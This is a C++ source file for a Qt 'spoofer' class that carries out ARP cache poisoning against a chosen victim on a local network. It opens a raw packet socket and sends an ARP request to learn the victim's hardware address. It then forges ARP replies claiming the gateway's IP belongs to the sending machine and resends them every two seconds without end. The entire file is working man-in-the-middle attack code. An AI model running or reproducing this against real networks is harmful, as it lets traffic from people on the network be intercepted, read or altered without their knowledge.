#include "spoofer.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <packet_types.h>
#include <linux/if_packet.h>
#include <errno.h>
#include <QDebug>
#include <string.h>
#include <unistd.h>

spoofer::spoofer(struct nic * nic, unsigned int victim)
{
    this->nic = nic;
    this->victim = victim;
}

spoofer::~spoofer()
{
    if(this->sock > 0)
        ::close(this->sock);
}

void spoofer::run()
{
    this->sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(this->sock < 0)
    {
        qDebug() << strerror(errno);
        return;
    }

    struct sockaddr_ll device;
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = this->nic->if_idx;
    device.sll_halen = ETH_ALEN;
    memset(device.sll_addr, 0xff, 6);

    unsigned char dest[6], src[6];
    unsigned char sha[6], tha[6];
    unsigned int spa, tpa;
    unsigned char pkt[64];

    //Dest= FF:FF:FF:FF:FF:FF, Src= system hw address
    //Type= ETH_P_ARP
    //Op= ARPOP_REQUEST
    //Sha= system hw address, Spa = system ip address
    //Tha= 0:0:0:0:0:0, Tpa= victim ip address

    memset(dest, 0xff, 6);
    memcpy(src, this->nic->if_paddr, 6);
    memcpy(sha, this->nic->if_paddr, 6);
    memset(tha, 0, 6);
    spa = this->nic->if_laddr;
    tpa = this->victim;

    memset(pkt, 0, 64);
    int size = create_arp_packet(pkt, ARPOP_REQUEST, dest, src, sha, tha, &spa, &tpa);

    //ARP Request to all
    if(sendto(this->sock, pkt, size, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
    {
        qDebug() << "line 63" << strerror(errno);
        return;
    }

    memset(pkt, 0, 64);
    //ARP Reply from victim
    if(recvfrom(this->sock, pkt, 64, 0, NULL, NULL) < 0)
    {
        qDebug() << "line 17" << strerror(errno);
        return;
    }

    struct ether_arp * arp = (struct ether_arp *)(pkt + sizeof(struct ether_header));

    //Dest= victim hw address, Src= system hw address
    //Type= ETH_P_ARP
    //Op= ARPOP_REPLY
    //Sha= system hw address, Spa = gateway ip address
    //Tha= victim hw address, Tpa= victim ip address

    memcpy(dest, arp->arp_sha, 6);
    memcpy(tha, arp->arp_sha, 6);
    spa = this->nic->gateway;

    memset(pkt, 0, 64);
    memcpy(device.sll_addr, arp->arp_sha, 6);
    size = create_arp_packet(pkt, ARPOP_REPLY, dest, src, sha, tha, &spa, &tpa);

    sleep(1);
    while(true)
    {
        if(sendto(this->sock, pkt, size, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
        {
            qDebug() << "line 95 " << strerror(errno);
            break;
        }
        sleep(2);
    }
}
